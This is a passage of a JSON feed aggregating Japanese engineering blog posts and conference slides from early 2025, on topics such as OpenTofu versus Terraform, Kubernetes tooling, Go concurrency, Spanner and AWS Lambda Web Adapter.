の登壇資料です。\\rhttps://jaguer-cloud-native.connpass.com/event/342024/\\r\\r参考リンク・画像など引用元一覧\\rhttps://ko.build/ \\rhttps://github.com/ko-build/ko \\rhttps://github.com/google/go-containerregistry \\rhttps://github.com/sigstore/cosign \\rhttps://github.com/opencontainers/image-spec \\rhttps://github.com/cncf/sandbox/issues/17 \\rhttps://github.com/ko-build/ko/issues/791 \\rhttps://github.com/cncf/sandbox/issues/163 \\rhttps://github.com/cncf/artwork/blob/main/projects/ko/stacked/color/ko-stacked-color.png \\rhttps://github.com/cncf/artwork/blob/main/projects/ko/icon/color/ko-icon-color.png","isoDate":"2025-02-19T05:00:00.000Z","dateMiliSeconds":1739941200000,"authorName":"bells17","authorId":"bells17"},{"title":"CNCFの公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア2名がCNCFプロジェクトでの貢献者TOP10にランクイン","link":"https://sreake.com/blog/rank-among-top-contributors-to-cncf-projects-in-japan/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 CNCF（Cloud Native Computing Foundation）の公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア 早川大貴・長澤翼（以下早川・長澤）がCNCFプロジェクトでの貢献者TOP10にランクインしたことをお知らせします。The post CNCFの公式ブログ「Japan’s CNCF DevStats 2024」にて、スリーシェイク所属のエンジニア2名がCNCFプロジェクトでの貢献者TOP10にランクイン first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-18T01:00:00.000Z","dateMiliSeconds":1739840400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする","link":"https://sreake.com/blog/aws-sam-quick-deploy-with-github-actions/","contentSnippet":"こんにちは。スリーシェイクの小林です。 本日は AWS Serverless Application Model（以下、AWS SAM）と GitHub Actions を用いて サーバーレス API の作成からデプロイ […]The post AWS SAM と GitHub Actions で爆速でサーバーレス API をデプロイする first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-16T23:00:00.000Z","dateMiliSeconds":1739746800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"goroutineによる頻出並行処理パターン2選","link":"https://zenn.dev/kamos/articles/c334faad2d3b33","contentSnippet":"はじめにgoruotineはgo言語の軽量スレッドの仕組みであり、並行処理が比較的簡単に実装できます。しかしその自由度の高さから、慣れていない人にとってはどのように実装したらよいのか、という迷いが生まれてしまいます。その中でもよく使う並行処理のパターンは決まっており、今回はよく自分が使うパターンを2つ紹介します。 前提こういう遅くて、エラーも起こる関数をテーマにします。func slowFunction(arg string) (string, error) {\\tfmt.Printf(\\"SLOW FUNCTION START: %s\\\\n\\", arg)\\tstart :=...","isoDate":"2025-02-16T08:56:32.000Z","dateMiliSeconds":1739696192000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"自分ばっかり大変と思ってるときは気をつけたほうがいい","link":"https://nnaka2992.hatenablog.com/entry/2025/02/16/140946","contentSnippet":"仕事をしていて数年ほどたつと自分はこんなに頑張ってるのに評価が低いと思うタイミングが来る。これは後々そんなことはなかったと気がつくものの、そのタイミングにいる間は不適当な評価を受けていると思いがちで、自尊心が肥大しがちである。自分ばっかり頑張っていると感じたときは、自分の仕事が本当に価値を生んでいるのかという観点に立ち返ったほうがいい。やらなくてもいい仕事に忙殺されていないか？ 楽してると思ってる人は本質的な仕事に集中しているのではないか？これはイシューからはじめよでいうところの犬の道に陥っている状態である。自分だけ大変と思っているときは、実際には価値を生み出していないにも限らず、仕事量によ達成感を成果と勘違いしていることが多い。自分ばっかり大変だ、となっているときは価値の低いことに時間を投入していないか見つめ直そうという自戒。","isoDate":"2025-02-16T05:09:46.000Z","dateMiliSeconds":1739682586000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【基礎】 GoでSpannerを使う","link":"https://zenn.dev/kamos/articles/b06c3ef3de894a","contentSnippet":"はじめにGoogleのSpannerデータベースはまだまだ知名度が低く、日本語での文献も豊富ではないため、いざ使うとなるとかなり苦労する技術です。ここでは最低限の概念を説明することにつとめ、通常利用においてSpannerのハードルを下げようと思いこの記事を執筆しました。基本的には以下の資料に載っている情報かと思いますが、実際にソースコードを見るとドキュメントの更新が追いついていない部分が多い印象でした。そのためクライアントライブラリのソースコードに可能な限り追従し、できるだけ平易な文章でまとめようと思います。https://cloud.google.com/spanner/do...","isoDate":"2025-02-16T03:29:52.000Z","dateMiliSeconds":1739676592000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて","link":"https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite","contentSnippet":"2025年02月13日 Developers Summit 2025 13-E-4 にて「インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて - Platform Engineeringの効果的な基盤構築のアプローチ」というタイトルで登壇します。同日にPFEM特別回 でも登壇するのですが資料頑張って作ったのでそっちも読んでください。完全版は機会があればお話するので依頼してください。\\r\\rイベント名:  Developers Summit 2025\\r\\r公式URL: https://event.shoeisha.jp/devsumi/20250213\\r\\rセッションURL: https://event.shoeisha.jp/devsumi/20250213/session/5546\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-13T05:00:00.000Z","dateMiliSeconds":1739422800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"国内４大通信キャリアのビジネスまとめ表","link":"https://qiita.com/masaru-komiyama/items/07b8eec241e41c1e0ebb","contentSnippet":"ふと、「国内通信キャリア各社のビジネスってどうなってるんだろう。サクッと確認したいからまとまった表があるといいなぁ」　と検索した際、あまり良い情報がヒットしなかった ＆ AI使っても微妙な結果しか得られなかったので、各社の公開情報を参考に、2025/2/12時点での、国内４...","isoDate":"2025-02-13T01:24:19.000Z","dateMiliSeconds":1739409859000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"Platform Engineeringは自由のめまい ","link":"https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","contentSnippet":"2025年02月13日 Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回にて「Platform Engineeringは自由のめまい - 技術の選択における不確実性と向き合う」というタイトルで登壇します。同日にDevelopers Summit 2025 でも登壇したのですが資料頑張って作ったのでそっちも読んでください。\\r\\rイベント名: Kubernetesで実践するPlatform Engineering発売記念！ PFEM特別回\\r\\r公式URL: https://platformengineering.connpass.com/event/342670/\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/02/14/071127","isoDate":"2025-02-12T05:00:00.000Z","dateMiliSeconds":1739336400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"kubeadmでk8sクラスタを構築する","link":"https://zenn.dev/moz_sec/articles/k8s-by-kubeadm","contentSnippet":"KubernetesKubernetesとは、複数のコンピュータでコンテナをいい感じに動かしてくれるものです。Kubernetesの説明はいろんなサイトに書いてあるため、そちらを参照してください。公式サイトも参考になります。https://kubernetes.io/docs/concepts/overview/ kubeadmkubeadmは、Kubernetesクラスタを構築するためのツールの１つです。他にも、kopsやkubesprayなどがありますが、kubeadmは最小限の構成でクラスタを構築することができます。https://kubernetes.io/...","isoDate":"2025-02-07T02:00:09.000Z","dateMiliSeconds":1738893609000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"GKEのComputeClassに関する調査","link":"https://sreake.com/blog/gke-computeclass/","contentSnippet":"はじめに Sreake事業部で長期インターンをしている竜です。 本記事では、GKEのカスタムコンピューティングクラスについて調査を行いました。 カスタムコンピューティングクラスの概要 GKEのカスタムコンピューティングク […]The post GKEのComputeClassに関する調査 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-07T00:00:00.000Z","dateMiliSeconds":1738886400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes History Inspector(KHI)を触ってみた","link":"https://speakerdeck.com/bells17/kubernetes-history-inspector-khi-wohong-tutemita","contentSnippet":"スライド内の参考リンク・画像など引用元一覧\\r\\rhttps://zenn.dev/bells17/scraps/67c852e99ad5a5 \\rhttps://github.com/GoogleCloudPlatform/khi \\rhttps://zenn.dev/google_cloud_jp/articles/9a7dc0df5e8906 \\rhttps://blog.g-gen.co.jp/entry/kubernetes-history-inspector-introduction \\rhttps://x.com/kyasbal_k/status/1884500133183905976 \\rhttps://x.com/ryusa_eng/status/1886328704432996463 \\rhttps://x.com/kkuchima/status/1884503826029228189 \\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-history.png\\rhttps://github.com/GoogleCloudPlatform/khi/blob/main/docs/en/images/gettingstarted-views.png \\rhttps://k8s-novice-jp.connpass.com/event/343899/ \\rhttps://jaguer-cloud-native.connpass.com/event/342024/","isoDate":"2025-02-05T05:00:00.000Z","dateMiliSeconds":1738731600000,"authorName":"bells17","authorId":"bells17"},{"title":"Terraform使いがOpenTofuについて入門してみる","link":"https://blog.masasuzu.net/entry/2025/02/04/185305","contentSnippet":"この記事はSRETT #11で発表されたものに加筆修正したものです。OpenTofuに関して調べたこととなります。3-shake SRE Tech Talk #11 オンサイト - connpass speakerdeck.com先日KubeCon + CloudNativeCon North America 2024に行ってきてました。その中で共同開催されていたOpenTofu Dayを見てOpenTofuに関して興味を持ちました。普段はTerraformを利用しており、あまりOpenTofuについては触ってきてないので、この機会に深堀りをしてみたいと思いました。参考: OpenTofu Dayまた、社内活動として技術検証を行っており、私の検証テーマとしてTerraformを中心としたIaC周りの技術調査を行ってるので、ちょうどいい機会だとも思いました。おことわりOpenTofuとはライセンス問題HashiCorp社の言い分コミュニティの懸念OpenTofuとTerraformの違いコマンドファイルRegistryremovedブロックState Encryptionbackendブロックの変数参照バージョン管理Security checkLinterCI/CDまとめ参考リンクライセンス変更フォークソースコード問題OpenTofuを使うためにHachiCorp買収おことわりこの記事はTerraformを知っている前提で書かれています。そのため細かい説明を省略している箇所があります。また筆者は普段はTerraformをメインで使用しており、OpenTofuを業務利用はしていません。OpenTofuとは2023年8月にTerraformを含めたHashiCorp製品のライセンスの変更を発表したことにより、これを懸念した企業やコミュニティによりOpenTFとしてフォークされます。その後OpenTFの名称はHashiCorp社の商標権への懸念からOpenTofuに改名されます。そのときの議論はissueを見るとたどることができます。参考: https://github.com/opentofu/opentofu/issues/2962023年9月にLinux Foundation傘下となります。参考: Linux Foundation Launches OpenTofu: A New Open Source Alternative to TerraformTerraformをフォークしたものなので基本的な使い勝手は同じです。コマンド名が terraform から  tofu に差し替えられています。ライセンス問題前項でさらっとライセンス変更と言いましたが、HashiCorp社は2023年8月に今後のリリースに関してライセンスを変更する旨を発表しました。これはオープンソースライセンスであるMozilla Public License（MPL） v2.0から商用サービスでの利用を制限するBusiness Source License（BUSLあるいはBSL） v1.1に変更するものです。参考: HashiCorp adopts Business Source Licenseこれに対して、利用企業およびコミュニティが懸念を示し、OpenTofuをフォークしたという流れになります。HashiCorp社の言い分従来BSLは本番使用(production use)が制限されます。ただし、ライセンスのParameterとして追加使用許可(Additional Use Grant)をすることによりTerraformと「競合製品」でなければ本番利用の制限はないとしてます。参考: https://github.com/hashicorp/terraform/blob/v1.11/LICENSE「競合製品」とは、有料サポート契約を含む第三者に販売される製品で、HashiCorp のライセンス対象製品の有料版の機能と大幅に重複する製品を指します。TerraformでいうところのHCP Terraform(Terraform Cloud)を想定しているのかと思います。また組織内でTerraformをホストして利用することは「競合製品」とはみなされなません。そのため利用者としては基本的には問題なく利用できるとしてます。参考: HashiCorp Licensing FAQ問題となるのはTerraformの機能を有償で提供しているSaaSと読み取れます。コミュニティの懸念HashiCorp社が説明したBSLと追加使用許可はあいまいであるとしてます。そのため、自身の行動が許諾範囲内か判断が困難である。「競合製品」の定義やライセンス自体が今後変更されるか不確実であると懸念を示してます。また、TerraformはOSSの恩恵を受けて成長してきてため、これからもオープンソースソフトウェアであるべきだと信じていると表明しています。参考: OpenTofu FAQOpenTofuのスポンサー企業としては以下のとおりです。HarnessGruntworkSpaceliftenv0ScalrHarnessはCI/CDまわりのSaaS製品、Gruntworksはterragruntの開発元、Specelift、env0、ScalrはTerraformをホストするSaaSサービスを運営しています。OpenTofuとTerraformの違いこの項ではそれぞれの違いについて説明していきます。OpenTofuはTerraform1.6-alphaからフォークされているのでそれまでに実装されていたものは互換があります。また、Terraform 1.6以降に追加された機能に関しても随時取り込まれています。そのため、1.5までの機能を使っているのであれば素直に移行できるかとは思います。バージョンごとに移行ガイドがあるので細かくはそれを参照すると良いです。参考: https://opentofu.org/docs/intro/migration/ただし、別のコードベースで開発がされているので、OpenTofuのみの独自実装もあります。ここではいくつか個人的に気になる違いについてあげていきます。コマンド基本的には terraform を tofuに置き換えていただければよいです。サブコマンドは一緒です。# Terraformterraform initterraform planterraform applyterraform destroy# OpenTofutofu inittofu plantofu applytofu destroyファイルterraform由来の .tf または .tofu の拡張子のファイルを設定ファイルとして認識します。json形式の .tf.json または .tofu.json の拡張子のファイルも同様です。同じディレクトリ内に.tf と .tofu の両方のファイルがあった場合、.tofu ファイルだけ認識して、.tf ファイルは無視されます。foo.tf  # <=== このファイルは無視されるfoo.tofuRegistryTerraform同様OpenTofuにもプロバイダーやモジュールのレジストリがあります。Terraform: https://registry.terraform.io/OpenTofu: https://registry.opentofu.orgOpenTofu Registryが登場したときに存在したTerraform Providerは反映されています。反映されていないものに関してもissueを立てれば反映されるようですhttps://github.com/opentofu/registryremovedブロックremovedブロックは既存のリソースを削除することなく、stateから削除することができます。それぞれ下記のように記述できます。下記の例ではAWSインスタンス自体は削除せず、stateから外すことを意図してます。# Terraformremoved {  from = aws_instance.example  lifecycle {    destroy = false  }}# OpenTofuremoved {  from = aws_instance.example}Terraformではlifecyleブロックでdestroy=falseの記述が必須です。参考: https://developer.hashicorp.com/terraform/language/resources/syntax#removing-resourcesOpenTofuではremovedブロックを書くだけで stateから削除されます。参考: https://opentofu.org/docs/language/resources/syntax/#removing-resourcesremovedブロックでやりたいことはstateから削除することなので、単純にリソースを削除したいなら対象resouceブロックを削除すればいいので、Terraformの記述方法のほうがへんな気がします。State EncryptionTerraformでは平文でStateに保存されてしまうという問題がありましたが、OpenTofuではクライアントサイドで暗号化する機能が追加されてます。クラウドプロバイダーの KMSキーなどを利用してStateを暗号化することができます。参考: State and Plan Encryption | OpenTofuTerraformではたとえsopsプロバイダーで機密情報を暗号化しても、Stateファイルには平文で保存されているので権限があれば機密情報が見えてしまう状態にありました。State自体が暗号化されることにより機密情報をよりセキュアに扱えるようになります。参考: Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか - 目の前に僕らの道があるbackendブロックの変数参照OpenTofuではbackendブロックで変数参照ができます参考: https://opentofu.org/docs/language/settings/backends/configuration/#variables-and-localsvariable \\"env\\" {  type    = string}locals {  path = \\"${var.env}/terraform.tfstate\\"}terraform {  backend \\"local\\" {    path = local.path  }}tofu init -var=\\"env=dev\\" -reconfiguretofu plan -var=\\"env=dev\\"Terraformで同じことをしたい場合、-backend-configを渡さないといけないため、backendを切り替える際に不便となります。terraform init -backend-config=./envs/dev/terraform.backend -reconfigureterraform plan -vars-file=./envs/dev/terraform.tfvarsOpenTofu DayのLTで紹介されてた環境名だけを渡して挙動を切り替えるパターンが現状だとterraformでは使えません参考:On Best Practices with OpenTofu Structuringバージョン管理複数プロジェクトでTerraform or OpenTofuを使う場合、プロジェクトごとに使用バージョンを管理する必要があります。いくつか選択肢を見ていきます。Terraformのバージョン管理ツールとしてよく使われるtfenvはOpenTofuには対応しません。参考:https://github.com/tfutils/tfenv/issues/409代わりにTerraformとOpenTofuに対応したtenvができました。こちらを利用すると良さそうです。https://github.com/tofuutils/tenv私はTerraformも合わせてプロジェクト内のツールのバージョン管理をまとめてasdfでやってますが、こちらは対応しています。https://github.com/virtualroot/asdf-opentofu自分はあまり使わないのですが、同じようなツールのaquaやmiseも両対応しています。https://aquaproj.github.io/https://github.com/jdx/miseSecurity checkTerraformだとtfsec(現 trivy config)がセキュリティチェックとして使われてるかと思います。ディスカッションはされており優先順位をつけて対応するとのことです。参考: https://github.com/aquasecurity/trivy/discussions/5069LintertflintはOpenTofuをサポートしないようです。参考: https://github.com/terraform-linters/tflint/issues/2037Linterの議論自体はissueで続いているようです。参考: https://github.com/opentofu/opentofu/issues/2213CI/CDHCP Terraform(旧Terraform Cloud)に相当するSaaSとしては、OpenTofuスポンサーのSpacelift、env0、Scalrなどがあります。tfactions、atlantis、diggerもOpenTofuに対応している模様です。まとめ現時点でOpenTofuに移行するするべきか?の問については、利用者側として現状では引き続き様子見かと思います。足回りも概ね揃ってきているが、まだ足りないエコシステムもあります。気になるところではIBM社にHashiCorp社の買収による統合完了の様子も追っていきたいところです。予定では2025年の1-3月期に統合完了するとのことなので、その後なにか動きがあるかもしれません。参考: IBM社によるHashiCorp社買収についてとはいえ、1つのツールが使えなくなることで業務が止まるのは避けたいので常に選択肢は複数取っておきたいところです。エンジニアとしてはOpenTofuに限らず、Pulumi、CDK(AWS)なども選択肢として取っておきたいです。それはそれとして、OpenTofuはTerraformとは違う独自進化をしているので、変更を追っていきたいところです。個人的にはState暗号化とかBackendの変数参照とかTerraformに入ってほしいです。それでは良い豆腐ライフを!、、、。ここまで書いてきたのですが、minamijoyoさんのTerraform職人のためのOpenTofu再入門2024がものすごく詳しいので、この記事以上に参考になるかと思います。参考リンクライセンス変更HashiCorp adopts Business Source LicenseHashiCorp | The Infrastructure Cloud CompanyHashiCorp、全製品のライセンスを商用利用に制限があるBSLライセンスに変更すると発表 － PublickeyTerraformのライセンスの変更とその影響何故、TerraformのBUSL-1.1へのライセンス変更は反発を受けたのか？ – Shuji SadoTerraform のライセンス変更についての考察 #Azure - QiitaフォークTerraformのフォークが「OpenTofu」としてLinux Foundation傘下で正式ローンチ。OpenTFから改名 － Publickeyソースコード問題【Infostand海外ITトピックス】ライセンスをめぐって対立　HashiCorpと「Terraform」派生のOpenTofu - クラウド WatchHashiCorp、TerraformをフォークしたOpenTofuに対しコードの不正コピーを警告。OpenTofuは完全否定 － PublickeyOpenTofuを使うためにTerraform職人のためのOpenTofu再入門2024 #Terraform - QiitaTerraform職人のためのOpenTofu入門 #Terraform - QiitaOpenTofuopentofu/opentofu: OpenTofu lets you declaratively manage your cloud infrastructure.Migrating to OpenTofu 1.7.x from Terraform | OpenTofuHachiCorp買収IBMがHashiCorpを64億ドルで買収、TerraformとAnsibleのシナジー効果などを見込む | IT LeadersIBM Japan Newsroom - ニュースリリースIBM社によるHashiCorp社買収について","isoDate":"2025-02-04T09:53:05.000Z","dateMiliSeconds":1738662785000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"スリーシェイク、「Developers Summit 2025」にて出展・登壇、および書籍「Kubernetesで実践するPlatform Engineering」の先行販売・サイン会を実施","link":"https://sreake.com/blog/developers-summit-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025年2月13日（木）・14日（金）に開催される「Developers Summit 2025」にSRE総合支援サービス「Sreake（スリーク）」のブースを出展します。The post スリーシェイク、「Developers Summit 2025」にて出展・登壇、および書籍「Kubernetesで実践するPlatform Engineering」の先行販売・サイン会を実施 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-04T01:00:00.000Z","dateMiliSeconds":1738630800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2025-01-31 吉祥寺.pm 37 初めての海外カンファレンス","link":"https://speakerdeck.com/masasuzu/2025-01-31-ji-xiang-si-dot-pm-37-chu-metenohai-wai-kanhuarensu","contentSnippet":"KubeCon NA 2024に行ってきたのでその経験を話します。\\r\\r吉祥寺.pm 37で話しました。\\rhttps://kichijojipm.connpass.com/event/339040/","isoDate":"2025-01-31T05:00:00.000Z","dateMiliSeconds":1738299600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AWS Lambda Web Adapter の Function URL を Cloudfront で公開する","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter-with-cloudfront/","contentSnippet":"これまでのおさらい前回、AWS Web Adapter を用いた AWS Lambda に Function URL を使って公開することはできた。今回はこれをカスタムドメインで公開するべく CloudFront と連携させます。OAC (Origin Access Control)2024年4月に CloudFront と Function URL の間を OAC (Origin Access Control) を使って Function URL への直アクセスを防ぐことができるようになっていたのでこれも試します。Amazon CloudFront が Lambda 関数 URL オリジンのオリジンアクセスコントロール (OAC) を新たにサポート","isoDate":"2025-01-30T15:01:24.000Z","dateMiliSeconds":1738249284000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS Lambda Web Adapter でお手軽 Web Service 公開","link":"https://blog.1q77.com/2025/01/aws-lambda-web-adapter/","contentSnippet":"ずっと AWS にも Cloud Run が欲しいなあと思っていました。AppRunner はコレじゃない…そんなある日、あれ？ AWS Lambda でいけんじゃね？と思い検索すると","isoDate":"2025-01-29T15:40:00.000Z","dateMiliSeconds":1738165200000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Renovate を手元の repository に対して debug 実行する","link":"https://blog.1q77.com/2025/01/renovate-local-debug/","contentSnippet":"renovate の設定を手元で試行錯誤したい時のメモです。Local Platform--platform=local を指定して実行すると local filesystem を対象として renovate を実行することができます。https://docs.renovatebot.com/modules/platform/local/手元の working copy の root directory で実行します。(npx は使わなくても良いが install からやってくれるので)","isoDate":"2025-01-28T10:45:08.000Z","dateMiliSeconds":1738061108000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG” @GDG Tokyo","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag-at-gdg-tokyo","contentSnippet":"https://gdg-tokyo.connpass.com/event/340671/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-28T05:00:00.000Z","dateMiliSeconds":1738040400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Site Reliability Engineering on Kubernetes","link":"https://speakerdeck.com/nwiizo/site-reliability-engineering-on-kubernetes","contentSnippet":"2025年01月26日 10:35-11:05（ルーム A）にて「Site Reliability Engineering on Kubernetes」というタイトルで登壇します。\\r\\rイベント名: SRE Kaigi 2025\\r\\r公式URL: https://2025.srekaigi.net/\\r\\rセッションURL: https://fortee.jp/sre-kaigi-2025/proposal/a75769d1-7835-4762-a1f6-508e714c8c8e\\r\\r登壇ブログ: https://syu-m-5151.hatenablog.com/entry/2025/01/26/005033","isoDate":"2025-01-26T05:00:00.000Z","dateMiliSeconds":1737867600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイクにおけるOSSの取り組み","link":"https://speakerdeck.com/bells17/surisieikuniokeruossnoqu-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #11 オンサイトの登壇資料です。\\r\\rhttps://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"bells17","authorId":"bells17"},{"title":"OpenClarityを覗いてみる","link":"https://speakerdeck.com/kojake_300/openclaritywosi-itemiru","contentSnippet":"","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2025-01-24-SRETT11-OpenTofuについてそろそろ調べてみるか","link":"https://speakerdeck.com/masasuzu/2025-01-24-srett11-opentofunituitesorosorodiao-betemiruka","contentSnippet":"OpenTofuについて調べてみた内容\\r\\rSRETT #11 https://3-shake.connpass.com/event/339212/","isoDate":"2025-01-24T05:00:00.000Z","dateMiliSeconds":1737694800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"論文紹介 ”Long-Context LLMs Meet RAG: Overcoming Challenges for Long Inputs in RAG”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-long-context-llms-meet-rag-overcoming-challenges-for-long-inputs-in-rag","contentSnippet":"https://genai-users.connpass.com/event/341391/\\r\\r大規模言語モデル（LLM）は、外部の知識源を利用することで、より強力な応答を生成できるようになります（これをRetrieval-Augmented Generation: RAGと呼びます）。LLMが処理できる入力テキストの長さが長くなるにつれて、より多くの関連情報をRAGで与えられるようになり、生成される回答の質が向上することが期待されます。一般的には、取得する情報が多いほど関連情報（高い再現率）も増え、結果として性能が向上すると考えられます。\\r\\rしかし、長文処理LLMにおけるRAGの性能が、取得する情報が増えすぎると逆に低下する現象を明らかにし、その原因が「ハードネガティブ」な情報にあることを示しました。そして、その問題を解決するために、効果的な学習不要および学習を伴うアプローチを提案しています。","isoDate":"2025-01-21T05:00:00.000Z","dateMiliSeconds":1737435600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイクのエンジニアが翻訳を担当した『Kubernetesで実践する Platform Engineering』が2月19日に発売","link":"https://sreake.com/blog/platform-engineering-in-practice-with-kubernetes/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、当社エンジニア4名が翻訳を担当した『Kubernetesで実践する Platform Engineering』が翔泳社より2025年2月19日に発売されることをお知らせします。The post スリーシェイクのエンジニアが翻訳を担当した『Kubernetesで実践する Platform Engineering』が2月19日に発売 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-01-14T01:00:00.000Z","dateMiliSeconds":1736816400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"interface、structで書くか、functionで書くか","link":"https://zenn.dev/kamos/articles/e044ae9cbb9f4c","contentSnippet":"始めにこの正月に、関数型ドメインモデリングという本を読みました。良書でした。https://amzn.asia/d/4NlwXFgそこで、今までオブジェクトで書いていたコードを関数としてかけないか?という思いつきでこの記事を書いた結果、なんだか関数型とは関係ない感じの記事になってしまいました。ご容赦ください。 ベースとなるサンプルコードまずはオブジェクト指向でよく使う形のサンプルを用意しました。タスク管理のモデルです。簡単のため、エラーなどはあまり返さないようにしています。domain/user.gopackage domainimport \\"fmt\\"typ...","isoDate":"2025-01-12T08:31:09.000Z","dateMiliSeconds":1736670669000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"2024年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/2024/12/31/2024_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2024-03-29 3-shake SRE Tech Talk #9 - connpass2024年の登壇はじめは所属会社である株式会社スリーシェイクの主催するイベントでした。データベーススペシャルということでDB関連がメインの回で、メインセッションとして30分枠で登壇しました。内容はo11yとデータベースを主軸とした話です。個人的には今後データベースのスロークエリ検知は従来のスロークエリログを利用する方法からo11yのトレースを通して発見していく方法が主流になるのではと思っています。データベースにオブザーバビリティを注入する - Speaker DeckSRETTというイベントがインフラ・SRE・アプリケーション側の試聴者が多いだろうと考えて、少しアプリ・SREよりの内容にしようとo11yをメインに据えた記憶があります。2024-04-26 YugabyteDB Japan Meetup #3登壇はじめからはなかなかのハイペースで、1ヶ月経たないうちにGoogle CloudのコミュニティであるJagu\'e\'rでの登壇です。やはりここもDBREの文脈でデータベースでブルーグリーンをできるようにしようという内容です。Jagu\'e\'r Observability-SRE分科会 Meetup#7 ハイブリッド - connpassGoogle CloudのDBにもAWS RDSのブルーグリーン相当の機能が欲しいです。2024-06-05 Google Cloud非公開イベントGoogle Cloudがパートナー向けに開催している非公開イベントでの登壇でした。2024年4月のGoogle Cloud Nextで発表された「全てのDBにベクトル検索を搭載します」という内容に衝撃を受けて、話した内容だった気がします。確かにすごいですが、全部のDBに必要なのかと問われると疑問です。Google Cloud で利用できるRDBのベクトル検索を徹底解剖！ - Speaker Deck結論としては特別な理由がなければCloud SQLを使え、です。2024-07-17 YugabyteDB Japan Meetup #5 - connpass約1年ぶりのYugabyteDB Japan Meetupのリベンジ登壇です。初回がなぜかDBREの話をしてYugabyteDBの話はフレーバー程度になってしまったので、本腰を入れてYugabyteDBならではの話をしました。大規模マルチテナントを解決するYugabyteDBという選択肢 - Speaker DeckYugabyteDBはメジャーなNewSQLでは唯一RLSをサポートしており、スケールアウトとセキュリティを両立したデータベースなので大規模マルチテナントの最適解では？　という内容です。この考えはAurora DSQLの登場でも意見は変わりませんが、Limitlessでいいのでは？　という気持ちはあります。2024-08-30 Jagu\'e\'r Cloud Native #15 ハイブリッド Meetup - connpass2024年2回目のJagu\'e\'rでの登壇でした。Google Cloudと不仲と噂されていたOracleの関係改善に驚いた結果話した内容です。やっていることはシンプルでOracle DBをKubernetesでうごかすOperatorを紹介しています。GoogleとOracle：この二人は友達になれました～GKEでOraOperatorを動かそう～ - Speaker Deckこの9月末まではGoogle Cloudのパートナーエンジニア表彰プログラムである、Google Cloud Partner Top Engineerの評価期間であったためGoogle Cloudに偏重した登壇を行っていました。2024-10-01 Kubernetes Novice Tokyo #34 - connpassJagu\'e\'r Cloud Native #15で登壇した内容を一部保管しつつ、されつつといった内容の登壇でした。@bells17_が運営のひとりなのでOracle DB on Kubernetesの話をするので早く開催してくださいとプレッシャーをかけた覚えがあります。その節はお世話になりました。登壇した直後にOracle 